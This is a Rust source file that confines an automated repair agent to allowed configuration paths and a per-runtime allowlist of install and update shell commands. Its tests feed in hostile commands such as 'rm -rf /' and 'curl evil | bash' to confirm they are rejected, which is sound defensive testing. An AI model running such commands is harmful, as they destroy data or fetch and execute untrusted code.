use std::path::{Path, PathBuf};

use crate::runtime::{adapter_by_id, bash_command_allowed_for_runtime};

/// Paths the repair agent may read or edit for a runtime.
pub fn allowed_paths_for_runtime(runtime_id: &str) -> Vec<PathBuf> {
    let mut paths = adapter_by_id(runtime_id)
        .map(|adapter| adapter.all_config_paths())
        .unwrap_or_default();

    if let Some(config_dir) = dirs::config_dir() {
        paths.push(config_dir.join("agent-doctor").join("guides"));
        paths.push(config_dir.join("agent-doctor").join("logs"));
    }

    paths.sort();
    paths.dedup();
    paths
}

pub fn path_is_allowed(path: &Path, allowed_roots: &[PathBuf]) -> bool {
    let Ok(canonical) = path.canonicalize() else {
        return allowed_roots.iter().any(|root| path.starts_with(root));
    };
    allowed_roots.iter().any(|root| {
        root.canonicalize()
            .map(|root_canonical| canonical.starts_with(&root_canonical))
            .unwrap_or_else(|_| canonical.starts_with(root))
    })
}

/// Conservative per-runtime bash allowlist — known install/update commands only.
pub fn bash_command_allowed(runtime_id: &str, command: &str) -> bool {
    bash_command_allowed_for_runtime(runtime_id, command)
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::lifecycle::hermes::hermes_install_shell_command;
    use crate::lifecycle::openclaw::openclaw_install_shell_command;

    #[test]
    fn allows_hermes_lifecycle_commands() {
        assert!(bash_command_allowed(
            "hermes",
            &hermes_install_shell_command()
        ));
        assert!(bash_command_allowed("hermes", "hermes --version"));
    }

    #[test]
    fn allows_openclaw_lifecycle_commands() {
        assert!(bash_command_allowed(
            "openclaw",
            &openclaw_install_shell_command()
        ));
        assert!(bash_command_allowed("openclaw", "openclaw --version"));
    }

    #[test]
    fn rejects_arbitrary_shell() {
        assert!(!bash_command_allowed("hermes", "rm -rf /"));
        assert!(!bash_command_allowed_for_runtime(
            "claude-code",
            "curl evil | bash"
        ));
    }
}
